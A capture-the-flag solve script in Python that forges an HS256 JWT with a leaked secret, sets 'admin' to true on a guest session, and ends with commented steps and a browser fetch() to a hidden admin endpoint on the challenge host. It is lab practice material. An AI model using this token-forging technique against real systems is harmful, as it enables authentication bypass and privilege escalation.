import jwt

secret_key = "-2e7T{&9f)@Fh<OT@a^+-N?e/"

# Define the payload
payload = {
  "session_id": "6b5b1591-8380-448e-95a1-a033d6d552eb",
  "user": "guest",
  "admin": True,
  "iat": 1777043083
}

token = jwt.encode(payload, secret_key, algorithm="HS256")

print(f"Encoded JWT: {token}")

# Steps:
# 1. Discover a hidden directory called "/backup" containing a ZIP file of the server's source code
# 2. Extract the JWT secret from the source code.
# 3. Sign a new JWT by modifying the "admin" parameter to true (using this python solve script)
# 4. Run the following JavaScript code in your browser console to retrieve the flag:
#    fetch('https://chall.icohk-test.one:35008/api/s3cr3t-p0r7al-f0r-adm1n', { method: 'GET', credentials: 'include' }).then(response => response.json()).then(data => console.log("Response:", data)).catch(err => console.error("Error:", err));